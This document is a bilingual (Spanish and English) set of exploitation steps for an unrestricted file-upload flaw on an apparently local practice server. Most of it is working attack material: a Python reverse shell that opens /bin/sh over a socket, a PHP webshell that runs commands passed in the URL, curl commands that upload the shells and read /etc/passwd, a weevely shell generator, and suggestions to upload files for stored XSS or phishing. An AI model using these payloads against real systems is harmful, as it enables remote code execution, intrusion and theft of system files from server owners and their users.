Pasos de explotación

  1. El servidor acepta archivos y puede ejecutarlos como Python o PHP según la extensión y dificultad.
  2. Ejemplo de payload Python (reverse shell):
import os,socket,subprocess
  s=socket.socket()
  s.connect(("127.0.0.1",4444))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  subprocess.call(["/bin/sh","-i"])
  # Guarda como shell.py y sube el archivo
  1. Ejemplo de payload PHP (webshell):
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
    # Guarda como shell.php y sube el archivo
    # Accede a /uploads/shell.php?cmd=id para probar
  1. Sube el archivo mediante el formulario o con curl:
curl -F "file=@shell.php" http://localhost:5000/upload
  curl -F "file=@shell.py" http://localhost:5000/upload
  1. Para webshell PHP, accede a /uploads/shell.php?cmd=id o el comando que desees.
curl "http://localhost:5000/uploads/shell.php?cmd=id"
  curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"
  1. También puedes subir un archivo .html para XSS, o un EXE para phishing.
  2. Para una shell interactiva, usa weevely: weevely generate password shell.php

Exploitation Steps

  1. The server accepts any file type without validating extension or content-type.
  2. Create a PHP webshell:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
  1. Upload it via the form or with curl:
curl -F "file=@shell.php" http://localhost:5000/upload
  1. Access and execute commands:
curl "http://localhost:5000/uploads/shell.php?cmd=id"
curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"
  1. You can also upload an .html for stored XSS, or an EXE for phishing.
  2. For an interactive shell, use weevely: weevely generate password shell.php
